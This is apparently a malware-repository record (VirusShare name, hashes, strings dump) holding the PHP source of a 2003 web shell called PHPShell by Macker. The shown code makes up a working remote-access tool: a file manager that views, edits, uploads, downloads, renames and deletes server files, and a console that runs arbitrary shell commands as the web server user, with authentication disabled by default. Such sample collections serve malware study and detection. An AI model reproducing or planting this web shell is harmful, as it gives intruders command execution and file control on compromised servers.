\t<input type=\\\"hidden\\\" name=\\\"lastcmd\\\" value=\\\"$lastcmd\\\">\n     \t<input type=\\\"hidden\\\" name=\\\"lastdir\\\" value=\\\"$lastdir\\\">\n     \t<input type=\\\"hidden\\\" name=\\\"file\\\" value=\\\"$file\\\">\n     \t<input type=\\\"hidden\\\" name=\\\"auth\\\" value=\\\"yes\\\">\n\n     \t<input type=\\\"submit\\\" value=\\\"Yes\\\"></form>\n       \t<form action=\\\"$SFileName?$urlAdd\\\" method=\\\"POST\\\">\n\t<input type=\\\"hidden\\\" name=\\\"cmd\\\" value=\\\"$lastcmd\\\">\n\t<input type=\\\"hidden\\\" name=\\\"dir\\\" value=\\\"$lastdir\\\">\n\t<input tabindex=\\\"0\\\" type=\\\"submit\\\" value=\\\"NO!\\\"></form>\";\n        }\n \techo \"</td></tr></center>\";\n}\nelseif ( $cmd==\"newfile\" ) { /*<!-- Create new file with default name --> */\n\techo \"<center><table><tr><td NOWRAP>\";\n \t$i = 1;\n \twhile (file_exists(\"$lastdir/newfile$i.txt\"))\n \t\t$i++;\n \t$file = fopen(\"$lastdir/newfile$i.txt\", \"w+\");\n \tif ($file == false)\n \t\techo \"Could not create the new file...<br>\";\n \telse\n \t\techo \"Successfully created: \\\"$lastdir/newfile$i.txt\\\"<br>\";\n \t\techo \"\n   \t\t\t<form action=\\\"$SFileName?$urlAdd\\\" method=\\\"POST\\\">\n\t\t\t<input type=\\\"hidden\\\" name=\\\"cmd\\\" value=\\\"$lastcmd\\\">\n\t\t\t<input type=\\\"hidden\\\" name=\\\"dir\\\" value=\\\"$lastdir\\\">\n\t\t\t<input tabindex=\\\"0\\\" type=\\\"submit\\\" value=\\\"Back to Haxplorer\\\">\n\t\t\t</form></center>\n \t\t\t</td></tr></table></center>   \t\t\";\n\t}\nelseif ( $cmd==\"newdir\" ) { /*<!-- Create new directory with default name --> */\n\techo \"<center><table><tr><td NOWRAP>\" ;\n \t$i = 1;\n \twhile (is_dir(\"$lastdir/newdir$i\"))\n  \t\t$i++;\n \t$file = mkdir(\"$lastdir/newdir$i\", 0777);\n \tif ($file == false)\n \t\techo \"Could not create the new directory...<br>\";\n \telse\n \t\techo \"Successfully created: \\\"$lastdir/newdir$i\\\"<br>\";\n \techo \"<form action=\\\"$SFileName?$urlAdd\\\" method=\\\"POST\\\">\n\t\t<input type=\\\"hidden\\\" name=\\\"cmd\\\" value=\\\"$lastcmd\\\">\n\t\t<input type=\\\"hidden\\\" name=\\\"dir\\\" value=\\\"$lastdir\\\">\n\t\t<input tabindex=\\\"0\\\" type=\\\"submit\\\" value=\\\"Back to Haxplorer\\\">\n\t\t</form></center></td></tr></table></center>\";\n}\nelseif ( $cmd==\"edit\" ) { /*<!-- Edit a file and save it afterwards with the saveedit block. --> */\n\t$contents = \"\";\n\t$fc = @file( $file );\n  \twhile ( @list( $ln, $line ) = each( $fc ) ) {\n  \t\t$contents .= htmlentities( $line ) ;\n \t}\n \techo \"<br><center><table><tr><td NOWRAP>\";\n\techo \"M<form action=\\\"$SFileName?$urlAdd\\\" method=\\\"post\\\">\\n\";\n\techo \"<input type=\\\"hidden\\\" name=\\\"cmd\\\" value=\\\"saveedit\\\">\\n\";\n\techo \"<strong>EDIT FILE: </strong>$file<br>\\n\";\n\techo \"<textarea rows=\\\"25\\\" cols=\\\"95\\\" name=\\\"contents\\\">$contents</textarea><br>\\n\";\n\techo \"<input size=\\\"50\\\" type=\\\"text\\\" name=\\\"file\\\" value=\\\"$file\\\">\\n\";\n\techo \"<input type=\\\"submit\\\" value=\\\"Save\\\">\";\n\techo \"</form>\";\n\techo \"</td></tr></table></center>\";\n}\nelseif ( $cmd==\"saveedit\" ) { /*<!-- Save the edited file back to a file --> */\n\t$fo = fopen($file, \"w\");\n\t$wrret = fwrite($fo, stripslashes($contents));\n\t$clret = fclose($fo);\n}\nelseif ( $cmd==\"downl\" ) { /*<!-- Save the edited file back to a file --> */\n\t$downloadfile = urldecode($file);\n\tif (function_exists(\"basename\"))\n    \t\t$downloadto = basename ($downloadfile);\n\telse\n\t\t$downloadto = \"download.ext\";\n\tif (!file_exists(\"$downloadfile\"))\n\t\techo \"The file does not exist\";\n\telse {\n\t\t$size = @filesize(\"$downloadfile\");\n\t\tif ($size != false) {\n\t\t\t$add=\"; size=$size\";\n\t\t}\t\t\t\n\t\telse {\n\t\t\t$add=\"\";\n\t\t}\n \t\theader(\"Content-Type: application/download\");\n\t\theader(\"Content-Disposition: attachment; filename=$downloadto$add\");\n\t\t$fp=fopen(\"$downloadfile\" ,\"rb\");\n\t\tfpassthru($fp);\n\t\tflush();\n\t}\n}\nelseif ( $cmd==\"upload\" ) { /* <!-- Upload File form --> */ \n   \t?>\n\t<center>\n\t <table>\n\t  <tr>\n\t   <td NOWRAP>\n    \t\tWelcome to the upload section...\n \t\tPlease note that the destination file will be\n\t\t<br> overwritten if it already exists!!!<br><br>\n \t\t<form enctype=\"multipart/form-data\" action=\"<?php echo \"$SFileName?$urlAdd\" ?>\" method=\"post\">\n \t\t\t<input type=\"hidden\" name=\"MAX_FILE_SIZE\" value=\"1099511627776\">\n \t\t\t<input type=\"hidden\" name=\"cmd\" value=\"uploadproc\">\n \t\t\t<input type=\"hidden\" name=\"dir\" value=\"<?php echo $dir ?>\">\n \t\t\t<input type=\"hidden\" name=\"lastcmd\" value=\"<?php echo $lastcmd ?>\">\n \t\t\t<input type=\"hidden\" name=\"lastdir\" value=\"<?php echo $lastdir ?>\">\n \t\t\tSelect local file:<br>\n \t\t\t<input size=\"75\" name=\"userfile\" type=\"file\"><br>\n \t\t\t<input type=\"submit\" value=\"Send File\">\n \t\t</form>\n\t\t<br>\n \t\t<form action=\"<?php echo \"$SFileName?$urlAdd\" ?>\" method=\"POST\">\n\t\t\t<input type=\"hidden\" name=\"cmd\" value=\"<?php echo $lastcmd ?>\">\n\t\t\t<input type=\"hidden\" name=\"dir\" value=\"<?php echo $lastdir ?>\">\n\t\t\t<input tabindex=\"0\" type=\"submit\" value=\"Cancel\">\n\t\t</form>\n\t   </td>\n\t  </tr>\n\t </table>\n\t</center>\n\n \t<?php\n}\nelseif ( $cmd==\"uploadproc\" ) { /* <!-- Process Uploaded file --> */\n\techo \"<center><table><tr><td NOWRAP>\";\n\tif (file_exists($userfile))\n\t\t$res = copy($userfile, \"$dir/$userfile_name\");\n\techo \"Uploaded \\\"$userfile_name\\\" to \\\"$userfile\\\"; <br>\\n\";\n     \tif ($res) {\n\t\techo \"Successfully moved \\\"$userfile\\\" to \\\"$dir/$userfile_name\\\".\\n<br><br>\";\n\t\techo \"Local filename: \\\"$userfile_name\\\".\\n<br>Remote filename: \\\"$userfile\\\".\\n<br>\";\n\t\techo \"Filesize: \".formatsize($userfile_size).\".\\n<br>Filetype: $userfile_type.\\n<br>\";\n\t}\n\telse {\n\t\techo \"Could not move uploaded file; Action aborted...\";\n\t}\n\techo \"<form action=\\\"$SFileName?$urlAdd\\\" method=\\\"POST\\\"><input type=\\\"hidden\\\" name=\\\"cmd\\\" value=\\\"$lastcmd\\\"><input type=\\\"hidden\\\" name=\\\"dir\\\" value=\\\"$lastdir\\\"><input tabindex=\\\"0\\\" type=\\\"submit\\\" value=\\\"Back to Haxplorer\\\"></form></center>\" ;\n\techo \"<br><br></td></tr></table></center>\";\n}\nelseif ( $cmd==\"file\" ) { /* <!-- View a file in text --> */\n        echo \"<hr>\"; \n\t$fc = @file( $file );  \twhile ( @list( $ln, $line ) = each( $fc ) ) {\n  \t\techo spacetonbsp(@htmlentities($line)).\"<br>\\n\";\n  \t}\n\techo \"<hr>\";\n}\nelseif ( $cmd==\"ren\" ) { /* <!-- File and Directory Rename --> */\n     \tif (function_exists('is_dir')) {\n \t\tif (is_dir(\"$oldfile\")) {\n \t\t\t$objname = \"Directory\";\n \t\t\t$objident = \"Directory\";\n  \t\t}\n \t\telse {\n \t\t\t$objname = \"Filename\";\n \t\t\t$objident = \"file\";\n \t\t}\n \t}\n   \techo \"<table width=100% border=\\\"0\\\" cellpadding=\\\"0\\\" cellspacing=\\\"0\\\"><tr><td width=100% style=\\\"class=\\\"silver border\\\"><center>&nbsp;Rename a file:&nbsp;</center></td></tr></table><br>\\n\";\n\tIf (empty($newfile) != true) {\n \t\techo \"<center>\";\n\t \t$return = @rename($oldfile, \"$olddir$newfile\");\n\t\tif ($return) {\n \t\t\techo \"$objident renamed successfully:<br><br>Old $objname: \\\"$oldfile\\\".<br>New $objname: \\\"$olddir$newfile\\\"\";\n \t\t}\n \t\telse {\n \t\t\tif ( @file_exists(\"$olddir$newfile\") ) {\n \t\t\t\techo \"Error: The $objident does already exist...<br><br>\\\"$olddir$newfile\\\"<br><br>Hit your browser's back to try again...\";\n \t\t\t}\n \t\t\telse {\n \t\t\t\techo \"Error: Can't copy the file, the file could be in use or you don't have permission to rename it.\";\n \t\t\t}\n  \t\t}\n \t\techo \"<form action=\\\"$SFileName?$urlAdd\\\" method=\\\"POST\\\"><input type=\\\"hidden\\\" name=\\\"cmd\\\" value=\\\"$lastcmd\\\"><input type=\\\"hidden\\\" name=\\\"dir\\\" value=\\\"$lastdir\\\"><input tabindex=\\\"0\\\" type=\\\"submit\\\" value=\\\"Back to Haxplorer\\\"></form></center>\" ;\n \t}\n \telse {\n \t\t$dpos = strrpos($oldfile, \"/\");\n \t\tif (strval($dpos)!=\"\") {\n \t\t\t$olddir = substr($oldfile, 0, $dpos+1);\n   \t\t}\n \t\telse {\n \t\t\t$olddir = \"$lastdir/\";\n\t\t}\n \t\t$fpos = strrpos($oldfile, \"/\");\n \t\tif (strval($fpos)!=\"\") {\n \t\t\t$inputfile = substr($oldfile, $fpos+1);\n   \t\t}\n \t\telse {\n\t \t\t$inputfile = \"\";\n \t\t}\n       \t\techo \"<center><table><tr><td><form action=\\\"$SFileName?$urlAdd\\\" method=\\\"post\\\">\\n\";\n \t\techo \"<input type=\\\"hidden\\\" name=\\\"cmd\\\" value=\\\"ren\\\">\\n\";\n \t\techo \"<input type=\\\"hidden\\\" name=\\\"oldfile\\\" value=\\\"$oldfile\\\">\\n\";\n \t\techo \"<input type=\\\"hidden\\\" name=\\\"olddir\\\" value=\\\"$olddir\\\">\\n\";\n \t\techo \"<input type=\\\"hidden\\\" name=\\\"lastcmd\\\" value=\\\"$lastcmd\\\">\\n\";\n \t\techo \"<input type=\\\"hidden\\\" name=\\\"lastdir\\\" value=\\\"$lastdir\\\">\\n\";\n \t\techo \"Rename \\\"$oldfile\\\" to:<br>\\n\";\n \t\techo \"<input size=\\\"100\\\" type=\\\"text\\\" name=\\\"newfile\\\" value=\\\"$inputfile\\\"><br><input type=\\\"submit\\\" value=\\\"Rename\\\">\"; \n\t\techo \"</form><form action=\\\"$SFileName?$urlAdd\\\" method=\\\"post\\\"><input type=\\\"hidden\\\" name=\\\"cmd\\\" value=\\\"$lastcmd\\\"><input type=\\\"hidden\\\" name=\\\"dir\\\" value=\\\"$lastdir\\\"><input type=\\\"submit\\\" value=\\\"Cancel\\\"></form>\";\n \t\techo \"</td></tr></table></center>\";\n \t}\n}\nelse if ( $cmd == \"con\") {\n\n?>\n<center>\n<table>\n <tr><td>\n<h3>PHPKonsole</h3>\n\n<?php\n\nif (ini_get('register_globals') != '1') {\n    if (!empty($HTTP_POST_VARS))\n\textract($HTTP_POST_VARS);\n\t  \n    if (!empty($HTTP_GET_VARS))\n\textract($HTTP_GET_VARS);\n\t      \n    if (!empty($HTTP_SERVER_VARS))\n\textract($HTTP_SERVER_VARS);\n    }\n\t\t    \n    if (!empty($work_dir)) {\n\tif (!empty($command)) {\n\t    if (ereg('^[[:blank:]]*cd[[:blank:]]+([^;]+)$', $command, $regs)) {\n\t        if ($regs[1][0] == '/') {\n\t            $new_dir = $regs[1];\n\t\t} else {\n\t\t    $new_dir = $work_dir . '/' . $regs[1];\n\t\t}\n\t\tif (file_exists($new_dir) && is_dir($new_dir)) {\n\t\t    $work_dir = $new_dir;\n\t\t}\n\t\tunset($command);\n\t    }\n\t}\n    }\n    if (file_exists($work_dir) && is_dir($work_dir)) {\n\tchdir($work_dir);\n    }\n    $work_dir = exec('pwd');\n?>\n\n    <form name=\"myform\" action=\"<?php echo \"$PHP_SELF?$urlAdd\" ?>\" method=\"post\">\n\t<table border=0 cellspacing=0 cellpadding=0 width=\"100%\"><tr><td>Current working directory: <b>\n\t<input type=\"hidden\" name=\"cmd\" value=\"con\">\n\t<?php\n\t    $work_dir_splitted = explode('/', substr($work_dir, 1));\n\t    printf('<a href=\"%s?$urlAddcmd=con&stderr=%s&work_dir=/\">Root</a>/', $PHP_SELF, $stderr);\n\t    if (!empty($work_dir_splitted[0])) {\n\t\t$path = '';\n\t\tfor ($i = 0; $i < count($work_dir_splitted); $i++) {\n\t\t    $path .= '/' . $work_dir_splitted[$i];\n\t\t    printf('<a href=\"%s?$urlAddcmd=con&stderr=%s&work_dir=%s\">%s</a>/', $PHP_SELF, $stderr, urlencode($path), $work_dir_splitted[$i]);\n\t\t}\n\t    }\n\t?></b></td>\n\t<td align=\"right\">Choose new working directory: <select class=\"inputtext\" name=\"work_dir\" onChange=\"this.form.submit()\">\n\t\n\t<?php\n\t$dir_handle = opendir($work_dir);\n\twhile ($dir = readdir($dir_handle)) {\n\t    if (is_dir($dir)) {\n\t\tif ($dir == '.') {\n\t\t    echo \"<option value=\\\"$work_dir\\\" selected>Current Directory</option>\\n\";\n\t\t} elseif ($dir == '..') {\n\t\t    if (strlen($work_dir) == 1) {\n\t\t    }\n\t\t    elseif (strrpos($work_dir, '/') == 0) {\n\t\t\techo \"<option value=\\\"/\\\">Parent Directory</option>\\n\";\n\t\t    } else {\n\t\t\techo \"<option value=\\\"\". strrev(substr(strstr(strrev($work_dir), \"/\"), 1)) .\"\\\">Parent Directory</option>\\n\";\n\t\t    }\n\t\t} else {\n\t\t    if ($work_dir == '/') {\n\t\t\techo \"<option value=\\\"$work_dir$dir\\\">$dir</option>\\n\";\n\t\t    } else {\n\t\t\techo \"<option value=\\\"$work_dir/$dir\\\">$dir</option>\\n\";\n\t\t    }\n\t\t}\n\t    }\n\t}\n\tclosedir($dir_handle);\n\t?>\n\t</select></td></tr></table>\n\t<p>Command: <input class=\"inputtext\" type=\"text\" name=\"command\" size=\"60\">\n\t<input name=\"submit_btn\" class=\"inputbutton\" type=\"submit\" value=\"Execute Command\"></p>\n\t<p>Enable <code>stderr</code>-trapping? <input type=\"checkbox\" name=\"stderr\"<?php if (($stderr) || (!isset($stderr)) ) echo \" CHECKED\"; ?>></p>\n\t<textarea cols=\"80\" rows=\"19\" class=\"inputtextarea\" wrap=off readonly><?php\n\t    if (!empty($command)) {\n\t        echo \"phpKonsole> \". htmlspecialchars($command) . \"\\n\\n\"; \n\t\tif ($stderr) {\n\t\t    $tmpfile = tempnam('/tmp', 'phpshell');\n\t\t    $command .= \" 1> $tmpfile 2>&1; \" . \"cat $tmpfile; rm $tmpfile\";\n\t\t} else if ($command == 'ls') {\n\t\t    $command .= ' -F';\n\t\t}\n\t\t$output = `$command`;\n\t\techo htmlspecialchars($output);\n\t    }\n\t?></textarea>\n    </form>\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t      \n    <script language=\"JavaScript\" type=\"text/javascript\">\n\tdocument.forms[0].command.focus();\n    </script>\n </td></tr></table>\n<?php\n}    \nelse { /* <!-- There is a incorrect or no parameter specified... Let's open the main menu --> */\n\t$isMainMenu = true;\n     ?>\n\t<table width=\"100%\" border=\"0\" cellpadding=\"0\" cellspacing=\"0\">\n\t <tr>\n\t  <td width=\"100%\" class=\"border\">\n\t   <center>&nbsp;-<[{ <?php echo $scriptTitle ?> Main Menu }]>-&nbsp;</center>\n\t  </td>\n\t </tr>\n\t</table>\n\t<br>\n \t<center>\n\t<table border=\"0\" NOWRAP>\n \t <tr>\n\t  <td valign=\"top\" class=\"silver border\">\n           <?php echo buildUrl( sp(2).\"<font color=\\\"navy\\\"><strong>==> Haxplorer <==</strong></font>\", \"cmd=dir&dir=.\").sp(2); ?>\n\t  </td>\n \t  <td style=\"BORDER-TOP: silver 1px solid;\" width=350 NOWRAP>\n\t   Haxplorer is a server side file browser wich (ab)uses the directory object to list\n \t   the files and directories stored on a webserver. This handy tools allows you to manage\n \t   files and directories on a unsecure server with php support.<br><br>This entire script\n \t   is coded for unsecure servers, if your server is secured the script will hide commands\n \t   or will even return errors to your browser...<br><br>\n\t  </td>\n\t </tr>\n \t <tr>\n\t  <td valign=\"top\" class=\"silver border\">\n           <?php echo buildUrl( sp(2).\"<font color=\\\"navy\\\"><strong>==> PHPKonsole <==</strong></font>\", \"cmd=con\").sp(2); ?>\n\t  </td>\n \t  <td style=\"BORDER-TOP: silver 1px solid;\" width=350 NOWRAP>\n\t   <br>PHPKonsole is just a little telnet like shell wich allows you to run commands on the webserver.\n\t    When you run commands they will run as the webservers UserID. This should work perfectly\n\t    for managing files, like moving, copying etc. If you're using a linux server, system commands\n\t    such as ls, mv and cp will be available for you... <br><br>This function will only work if the\n\t    server supports php and the execute commands...<br><br>\n\t  </td>\n\t </tr>\n        </table>\n\t</center>\n\t<br>\n     <?php\n}\n\nif ($cmd != \"downl\") {\n\tif ( $isMainMenu != true) {\n \t\t?>\n\t\t<table width=\"100%\" border=\"0\" cellpadding=\"0\" cellspacing=\"0\">\n\t\t <tr>\n\t\t  <td width=\"100%\" style=\"class=\"silver border\">\n\t\t   <center><strong>\n\t\t    &nbsp;&nbsp;<?php echo buildUrl(\"<font color=\\\"navy\\\">[&nbsp;Main Menu&nbsp;]  </font>\", \"cmd=&dir=\");      ?>&nbsp;&nbsp;\n\t\t    &nbsp;&nbsp;<?php echo buildUrl(\"<font color=\\\"navy\\\">[&nbsp;PHPKonsole&nbsp;] </font>\", \"cmd=con\");        ?>&nbsp;&nbsp;\n                    &nbsp;&nbsp;<?php echo buildUrl(\"<font color=\\\"navy\\\">[&nbsp;Haxplorer&nbsp;]  </font>\", \"cmd=dir&dir=.\");  ?> &nbsp;&nbsp;\n \t\t   </strong></center>\n\t\t  </td>\n\t\t </tr>\n\t\t</table>\n\t\t<br>\n\t\t<?php\n}\n\t?>\n\t<table width=100% border=\"0\" cellpadding=\"0\" cellspacing=\"0\">\n\t <tr>\n\t  <td width=\"100%\" class=\"silver border\">\n\t   <center>&nbsp;<?php echo $scriptident ?> - <?php echo $scriptver ?> - <?php echo $scriptdate ?>&nbsp;</center>\n\t  </td>\n\t </tr>\n\t</table>\n \t   </td>\n  </tr>\n </table>\n\n  <?php\n }\n\n?>"
    },
    "filename": "VirusShare_1dccb1ea9f24ffbd085571c88585517b",
    "filesize": 38250,
    "filetype": "PHP script, ASCII text, with CRLF line terminators",
    "hashes": {
        "md5": "1dccb1ea9f24ffbd085571c88585517b",
        "sha1": "1e5c6558486db6333246ee2580bafde628af6cda",
        "sha256": "60505a1d3406e698abd0d1019aff73029d23af426a60672d85780d0f6517fccf"
    },
    "peinfo": {},
    "strings": {
        "dump": [
            "<?php ",
            "*****************************************************************************************",
            "*                           PHPSHELL.PHP  BY MACKER     August 28th 2003                *",
            "***************************************************************************************** ",
            "*                                                                                       *  ",
            "*   Welcome to Macker's PHPShell script...                                              * ",
            "*   This script will allow you to browse webservers etc...                              * ",
            "*   Just copy the file to your directory and open it in your Internet Browser.          * ",
            "*                                                                                       * ",
            "*   The webserver should support PHP...                                                 * ",
            "*                                                                                       * ",
            "*   You can modify the script if you want, but please send me a copy to:                *  ",
            "*                               DRAZZ01@HOTMAIL.COM                                     * ",
            "***************************************************************************************** ",
            "!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!! ",
            "!!   PLEASE NOTE: You should use this script at own risk, it should do damage to the   !! ",
            "!!                Sites or even the server... You are responsible for your own deeds.  !! ",
            "!!                The admin of your webserver should always know you are using this    !!",
            "!!                script.                                                              !! ",
            "!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!! ",
            "/*Setting some envirionment variables...*/ ",
            "/* I added this to ensure the script will run correctly...",
            "   Please enter the Script's filename in this variable. */   ",
            "$SFileName=$PHP_SELF;",
            "/* uncomment the two following variables if you want to use http",
            "   authentication. This will password protect your PHPShell */",
            "//$http_auth_user = \"phpshell\";\t/* HTTP Authorisation username, uncomment if you want to use this */",
            "//$http_auth_pass = \"phpshell\";\t/* HTTP Authorisation password, uncomment if you want to use this */\t    ",
            "error_reporting(0);",
            "$PHPVer=phpversion();",
            "$isGoodver=(intval($PHPVer[0])>=4);",
            "$scriptTitle = \"PHPShell\";",
            "$scriptident = \"$scriptTitle by Macker\";",
            "$urlAdd = \"\";",
            "$formAdd = \"\";",
            "function walkArray($array){",
            "  while (list($key, $data) = each($array))",
            "    if (is_array($data)) { walkArray($data); }",
            "    else { global $$key; $$key = $data; global $urlAdd; $urlAdd .= \"$key=\".urlencode($data).\"&\";}",
            "if (isset($_PUT)) walkArray($_PUT);",
            "if (isset($_GET)) walkArray($_GET);",
            "if (isset($_POST)) walkArray($_POST);",
            "$pos = strpos($urlAdd, \"s=r\");",
            "if (strval($pos) != \"\") {",
            "$urlAdd= substr($urlAdd, 0, $pos);",
            "$urlAdd .= \"&s=r&\";",
            "if (empty($Pmax))",
            "\t$Pmax = 125;   /* Identifies the max amount of Directories and files listed on one page */",
            "if (empty($Pidx)) ",
            "\t$Pidx = 0;",
            "$dir = str_replace(\"\\\\\", \"/\", str_replace(\"//\", \"/\", str_replace(\"\\\\\\\\\", \"\\\\\", $dir )));",
            "$file = str_replace(\"\\\\\", \"/\", str_replace(\"//\", \"/\", str_replace(\"\\\\\\\\\", \"\\\\\", $file )));",
            "$scriptdate = \"August 28th 2003\";",
            "$scriptver = \"Version 2.6.6dev\";",
            "$LOCAL_IMAGE_DIR = \"img\";",
            "$REMOTE_IMAGE_URL = \"img\";",
            "$img = array(",
            "\t\t\t\t\"Edit\" \t\t=> \"edit.gif\",",
            "\t\t\t\t\"Download\" \t=> \"download.gif\",",
            "\t\t\t\t\"Upload\" \t=> \"upload.gif\",",
            "\t\t\t\t\"Delete\" \t=> \"delete.gif\",",
            "\t\t\t\t\"View\" \t\t=> \"view.gif\",",
            "\t\t\t\t\"Rename\" \t=> \"rename.gif\",",
            "\t\t\t\t\"Move\" \t\t=> \"move.gif\",",
            "\t\t\t\t\"Copy\" \t\t=> \"copy.gif\",",
            "\t\t\t\t\"Execute\" \t=> \"exec.gif\"",
            "            );",
            "while (list($id, $im)=each($img))",
            "\tif (file_exists(\"$LOCAL_IMAGE_DIR/$im\"))",
            "\t\t$img[$id] = \"<img height=\\\"16\\\" width=\\\"16\\\" border=\\\"0\\\" src=\\\"$REMOTE_IMAGE_URL/$im\\\" alt=\\\"$id\\\">\";",
            "\telse",
            " \t\t$img[$id] = \"[$id]\";",
            "/* HTTP AUTHENTICATION */",
            "    if  ( ( (isset($http_auth_user) ) && (isset($http_auth_pass)) ) && ( !isset($PHP_AUTH_USER) || $PHP_AUTH_USER != $http_auth_user || $PHP_AUTH_PW != $http_auth_pass)  ||  (($logoff==1) && $noauth==\"yes\")  )   { ",
            "\t    setcookie(\"noauth\",\"\");",
            "\t    Header( \"WWW-authenticate:  Basic realm=\\\"$scriptTitle $scriptver\\\"\");",
            "\t    Header( \"HTTP/1.0  401  Unauthorized\");",
            "\t    echo \"Your username or password is incorrect\";",
            "\t    exit ;",
            "\t\t\t     ",
            "    } ",
            "function buildUrl($display, $url) {",
            "        global $urlAdd;",
            "        $url = $SFileName . \"?$urlAdd$url\";",
            "\treturn \"<a href=\\\"$url\\\">$display</a>\";",
            "function sp($mp) {",
            "\tfor ( $i = 0; $i < $mp; $i++ )",
            "\t\t$ret .= \"&nbsp;\";",
            "\treturn $ret;",
            "function spacetonbsp($instr) { return str_replace(\" \", \"&nbsp;\", $instr);  } ",
            "function Mydeldir($Fdir) {",
            "\tif (is_dir($Fdir)) {",
            "\t\t$Fh=@opendir($Fdir);",
            " \t\twhile ($Fbuf = readdir($Fh))",
            " \t\t\tif (($Fbuf != \".\") && ($Fbuf != \"..\"))",
            "\t\t\t\tMydeldir(\"$Fdir/$Fbuf\");",
            "\t\t@closedir($Fh);",
            "\t\t\t\treturn rmdir($Fdir);",
            "\t}\telse {",
            "\t\treturn unlink($Fdir);",
            "function arrval ($array) {",
            "list($key, $data) = $array;",
            "return $data;",
            "function formatsize($insize) {  ",
            "\t$size = $insize;",
            "\t$add = \"B\";",
            "\tif ($size > 1024) {",
            " \t\t$size = intval(intval($size) / 1.024)/1000;",
            " \t\t$add = \"KB\";",
            " \tif ($size > 1024) {",
            " \t\t$size = intval(intval($size) / 1.024)/1000;",
            " \t\t$add = \"MB\";",
            " \tif ($size > 1024) {",
            " \t\t$size = intval(intval($size) / 1.024)/1000;",
            " \t\t$add = \"GB\";",
            " \tif ($size > 1024) {",
            " \t\t$size = intval(intval($size) / 1.024)/1000;",
            " \t\t$add = \"TB\";",
            " \treturn \"$size $add\";",
            "if ($cmd != \"downl\") {",
            "<!-- <?php echo $scriptident ?>, <?php echo $scriptver ?>, <?php echo $scriptdate ?>  -->",
            "<HTML>",
            " <HEAD>",
            "  <STYLE>",
            "  <!--",
            "    A{ text-decoration:none; color:navy; font-size: 12px }",
            "    body { font-size: 12px; ",
            "           font-family: arial, helvetica;",
            "            scrollbar-width: 5;",
            "            scrollbar-height: 5;",
            "            scrollbar-face-color: white;",
            "            scrollbar-shadow-color: silver;",
            "            scrollbar-highlight-color: white;",
            "            scrollbar-3dlight-color:silver;",
            "            scrollbar-darkshadow-color: silver;",
            "            scrollbar-track-color: white;",
            "            scrollbar-arrow-color: black;",
            "    }",
            "    Table { font-size: 12px; }",
            "    TR{ font-size: 12px; }",
            "    TD{ font-size: 12px; ",
            "        font-family: arial, helvetical;",
            "        BORDER-LEFT: black 0px solid; ",
            "\tBORDER-RIGHT: black 0px solid; ",
            "\tBORDER-TOP: black 0px solid; ",
            "\tBORDER-BOTTOM: black 0px solid; ",
            "\tCOLOR: black; ",
            "    }",
            "    .border{       BORDER-LEFT: black 1px solid;",
            " \t\t   BORDER-RIGHT: black 1px solid;",
            " \t\t   BORDER-TOP: black 1px solid;",
            " \t\t   BORDER-BOTTOM: black 1px solid;",
            " \t\t }",
            "    .none  {       BORDER-LEFT: black 0px solid;",
            " \t\t   BORDER-RIGHT: black 0px solid;",
            " \t\t   BORDER-TOP: black 0px solid;",
            " \t\t   BORDER-BOTTOM: black 0px solid;",
            " \t\t }",
            "    .inputtext {",
            "\t\t    background-color: #EFEFEF;",
            "\t\t    font-family: arial, helvetica;",
            "\t\t    border: 1px solid #000000;",
            "\t\t    height: 20;",
            "    }",
            "    .lighttd {       background: #F8F8F8;",
            "    }",
            "    .darktd {        background: #E8E8E8;",
            "    }",
            "    input { font-family: arial, helvetica;",
            "    }",
            "    .inputbutton {",
            "                        background-color: silver;",
            "\t\t\tborder: 1px solid #000000;",
            "\t\t\tborder-width: 1px;",
            "\t\t\theight: 20;",
            "    }",
            "    .inputtextarea {",
            "\t\t    background-color: #EFEFEF;",
            "\t\t    border: 1px solid #000000;",
            "\t\t    scrollbar-width: 5;",
            "\t\t    scrollbar-height: 5;",
            "\t\t    scrollbar-face-color: #EFEFEF;",
            "\t\t    scrollbar-shadow-color: silver;",
            "\t\t    scrollbar-highlight-color: #EFEFEF;",
            "\t\t    scrollbar-3dlight-color:silver;",
            "\t\t    scrollbar-darkshadow-color: silver;",
            "\t\t    scrollbar-track-color: #EFEFEF;",
            "\t\t    scrollbar-arrow-color: black;",
            "    }",
            "    .top { BORDER-TOP: black 1px solid; }",
            "    .textin { BORDER-LEFT: silver 1px solid;",
            "              BORDER-RIGHT: silver 1px solid;",
            " \t      BORDER-TOP: silver 1px solid;",
            "              BORDER-BOTTOM: silver 1px solid;",
            "              width: 99%; font-size: 12px; font-weight: bold; color: navy;",
            "            }",
            "    .notop { BORDER-TOP: black 0px solid; }",
            "    .bottom { BORDER-BOTTOM: black 1px solid; }",
            "    .nobottom { BORDER-BOTTOM: black 0px solid; }",
            "    .left { BORDER-LEFT: black 1px solid; }",
            "    .noleft { BORDER-LEFT: black 0px solid; }",
            "    .right { BORDER-RIGHT: black 1px solid; }",
            "    .noright { BORDER-RIGHT: black 0px solid; }",
            "    .silver{ BACKGROUND: silver; }",
            "  -->",
            "  </STYLE>",
            "  <TITLE><?php echo $SFileName ?></TITLE>",
            " </HEAD>",
            " <body topmargin=\"0\" leftmargin=\"0\">",
            " <div style=\"position: absolute; background: white; z-order:10000; top:0; left:0; width: 100%; height: 100%;\">",
            " <table width=100% height=\"100%\" NOWRAP border=\"0\">",
            "  <tr NOWRAP>",
            "   <td width=\"100%\" NOWRAP>",
            "    <table NOWRAP width=100% border=\"0\" cellpadding=\"0\" cellspacing=\"0\">",
            "     <tr>",
            "      <td width=\"100%\" class=\"silver border\">",
            "       <center>",
            "\t    <strong>",
            "\t\t <font size=3><?php echo $scriptident ?> - <?php echo $scriptver ?> - <?php echo $scriptdate ?></font>",
            "            </strong>",
            "       </center>",
            "      </td>",
            "     </tr>",
            "    </table><br>",
            "\t<?php",
            "if ( $cmd==\"dir\" ) {",
            "  \t$h=@opendir($dir);",
            " \tif ($h == false) {",
            "  \t\techo \"<br><font color=\\\"red\\\">\".sp(3).\"\\n\\n\\n\\n",
            "                COULD NOT OPEN THIS DIRECTORY!!!<br>\".sp(3).\"\\n",
            "                THE SCRIPT WILL RESULT IN AN ERROR!!!",
            "                <br><br>\".sp(3).\"\\n",
